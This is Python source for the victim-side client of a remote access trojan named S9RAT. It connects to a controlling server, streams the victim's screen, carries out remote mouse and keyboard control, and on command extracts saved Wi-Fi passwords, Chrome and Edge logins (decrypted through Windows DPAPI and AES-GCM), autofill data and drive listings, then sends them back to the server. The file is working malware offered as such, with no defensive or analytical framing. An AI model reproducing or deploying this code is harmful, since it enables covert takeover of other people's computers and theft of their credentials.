
import socket
import json
import os
import platform
import subprocess
import threading
import time
import logging
from .protocol import (
    pack_message, recv_message, MSG_TYPES, DEFAULT_PORT,
    MAGIC, PROTOCOL_VERSION,
)

logger = logging.getLogger("S9RAT")


class VictimClient:

    def __init__(self, server_host: str, server_port: int = DEFAULT_PORT,
                 password: str = ""):
        self.server_host = server_host
        self.server_port = server_port
        self.password = password
        self._sock: socket.socket | None = None
        self._running = False
        self._screen_active = False
        self._control_enabled = False

    def connect(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(10)
            self._sock.connect((self.server_host, self.server_port))
            self._running = True
            self._authenticate()
            return True
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def _authenticate(self):
        auth_msg = pack_message("AUTH", {
            "password": self.password,
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "pid": os.getpid(),
        })
        self._sock.sendall(auth_msg)
        msg_type, data = recv_message(self._sock)
        if msg_type == "AUTH_OK":
            logger.info("Authenticated")
        else:
            raise ConnectionError("Authentication failed")

    def run(self):
        self._running = True
        threads = [
            threading.Thread(target=self._command_loop, daemon=True),
            threading.Thread(target=self._screen_loop, daemon=True),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def _command_loop(self):
        while self._running:
            try:
                msg_type, data = recv_message(self._sock)
                self._handle_command(msg_type, data)
            except ConnectionError:
                logger.info("Disconnected")
                self._running = False
                break
            except Exception as e:
                logger.error(f"Command error: {e}")
                time.sleep(0.1)

    def _handle_command(self, msg_type: str, data: dict):
        if msg_type == "HEARTBEAT":
            self._sock.sendall(pack_message("HEARTBEAT_ACK", {}))
        elif msg_type == "SCREEN_START":
            self._screen_active = True
        elif msg_type == "SCREEN_STOP":
            self._screen_active = False
        elif msg_type == "CONTROL_ENABLE":
            self._control_enabled = True
        elif msg_type == "CONTROL_DISABLE":
            self._control_enabled = False
        elif msg_type == "CONTROL_INPUT" and self._control_enabled:
            self._execute_input(data)
        elif msg_type == "EXFIL_REQUEST":
            request_type = data.get("type", "")
            self._handle_exfil(request_type)

    def _execute_input(self, data: dict):
        try:
            import pyautogui
            input_type = data.get("input_type", "")
            if input_type == "mouse_move":
                pyautogui.moveTo(data["x"], data["y"], duration=0.1)
            elif input_type == "mouse_click":
                pyautogui.click(data["x"], data["y"], button=data.get("button", "left"))
            elif input_type == "mouse_double":
                pyautogui.doubleClick(data["x"], data["y"])
            elif input_type == "mouse_down":
                pyautogui.mouseDown(data["x"], data["y"], button=data.get("button", "left"))
            elif input_type == "mouse_up":
                pyautogui.mouseUp(data["x"], data["y"], button=data.get("button", "left"))
            elif input_type == "mouse_scroll":
                pyautogui.scroll(data.get("amount", 0), data["x"], data["y"])
            elif input_type == "key_press":
                pyautogui.press(data.get("key", ""))
            elif input_type == "key_down":
                pyautogui.keyDown(data.get("key", ""))
            elif input_type == "key_up":
                pyautogui.keyUp(data.get("key", ""))
            elif input_type == "type_text":
                pyautogui.typewrite(data.get("text", ""), interval=0.02)
        except Exception as e:
            logger.error(f"Input error: {e}")

    def _screen_loop(self):
        try:
            import mss
            sct = mss.mss()
        except ImportError:
            logger.error("mss not installed for screen capture")
            return

        while self._running:
            if self._screen_active:
                try:
                    monitor = sct.monitors[0]
                    screenshot = sct.grab(monitor)
                    import io
                    from PIL import Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=50)
                    frame_data = buf.getvalue()

                    self._sock.sendall(pack_message("SCREEN_FRAME", {
                        "size": len(frame_data),
                    }))
                    self._sock.sendall(frame_data)
                except Exception as e:
                    logger.error(f"Screen capture error: {e}")
            time.sleep(0.07)

    def _handle_exfil(self, exfil_type: str):
        data = {}
        try:
            if exfil_type == "system_info":
                data = self._get_system_info()
            elif exfil_type == "wifi_passwords":
                data = self._get_wifi_passwords()
            elif exfil_type == "browser_creds":
                data = self._get_browser_creds()
            elif exfil_type == "file_list":
                data = self._get_file_list()
        except Exception as e:
            data = {"error": str(e)}

        self._sock.sendall(pack_message("EXFIL_DATA", {
            "type": exfil_type,
            "data": data,
        }))

    def _get_system_info(self) -> dict:
        info = {
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "processor": platform.processor(),
            "cwd": os.getcwd(),
            "python_version": platform.python_version(),
        }
        try:
            result = subprocess.run("ipconfig" if platform.system() == "Windows" else "ifconfig",
                                    shell=True, capture_output=True, text=True, timeout=5)
            info["network"] = result.stdout[:2000]
        except Exception:
            pass
        return info

    def _get_wifi_passwords(self) -> dict:
        passwords = {}
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    "netsh wlan show profiles",
                    shell=True, capture_output=True, text=True, timeout=10
                )
                profiles = []
                for line in result.stdout.split("\n"):
                    if "All User Profile" in line:
                        profile = line.split(":")[-1].strip()
                        profiles.append(profile)
                for profile in profiles:
                    result = subprocess.run(
                        f'netsh wlan show profile name="{profile}" key=clear',
                        shell=True, capture_output=True, text=True, timeout=10
                    )
                    for line in result.stdout.split("\n"):
                        if "Key Content" in line:
                            pwd = line.split(":")[-1].strip()
                            passwords[profile] = pwd
        except Exception as e:
            passwords["_error"] = str(e)
        return passwords

    def _get_browser_creds(self) -> dict:
        creds = {"chrome": [], "edge": [], "autofill": []}
        try:
            if platform.system() == "Windows":
                import sqlite3
                import shutil
                import json
                import base64

                def _decrypt_chrome_password(encrypted_password: bytes, local_state_path: str) -> str:
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        encrypted_key = encrypted_key[5:]
                        import ctypes
                        import ctypes.wintypes

                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

                        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
                        blob_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                            aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                        else:
                            return "[decryption failed]"
                        if encrypted_password[:3] == b"v10":
                            nonce = encrypted_password[3:15]
                            ciphertext = encrypted_password[15:-16]
                            tag = encrypted_password[-16:]
                            from Crypto.Cipher import AES
                            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                        return "[unsupported format]"
                    except Exception:
                        return "[decryption failed]"

                def _read_browser_logins(browser_name: str, user_data_path: str, profile: str = "Default"):
                    logins = []
                    login_db = os.path.join(user_data_path, profile, "Login Data")
                    local_state = os.path.join(user_data_path, "Local State")
                    if not os.path.exists(login_db):
                        return logins
                    temp_path = login_db + ".tmp"
                    try:
                        shutil.copy2(login_db, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor:
                            password = "[encrypted]"
                            if row[2]:
                                password = _decrypt_chrome_password(row[2], local_state)
                            logins.append({"url": row[0], "username": row[1], "password": password})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return logins

                def _read_autofill(user_data_path: str, profile: str = "Default"):
                    entries = []
                    web_data = os.path.join(user_data_path, profile, "Web Data")
                    if not os.path.exists(web_data):
                        return entries
                    temp_path = web_data + ".tmp"
                    try:
                        shutil.copy2(web_data, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT name, value FROM autofill")
                        for row in cursor:
                            if row[0] and row[1]:
                                entries.append({"field": row[0], "value": row[1]})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return entries

                chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
                if os.path.exists(chrome_path):
                    creds["chrome"] = _read_browser_logins("chrome", chrome_path, "Default")
                    creds["autofill"] = _read_autofill(chrome_path, "Default")

                edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
                if os.path.exists(edge_path):
                    creds["edge"] = _read_browser_logins("edge", edge_path, "Default")
                    if not creds["autofill"]:
                        creds["autofill"] = _read_autofill(edge_path, "Default")
        except Exception as e:
            creds["_error"] = str(e)
        return creds

    def _get_file_list(self) -> dict:
        listing = {}
        for drive in ["C:\\", "D:\\"]:
            if os.path.exists(drive):
                try:
                    entries = os.listdir(drive)[:100]
                    listing[drive] = entries
                except Exception:
                    pass
        return listing

    def disconnect(self):
        self._running = False
        if self._sock:
            try:
                self._sock.sendall(pack_message("DISCONNECT", {}))
                self._sock.close()
            except Exception:
                pass
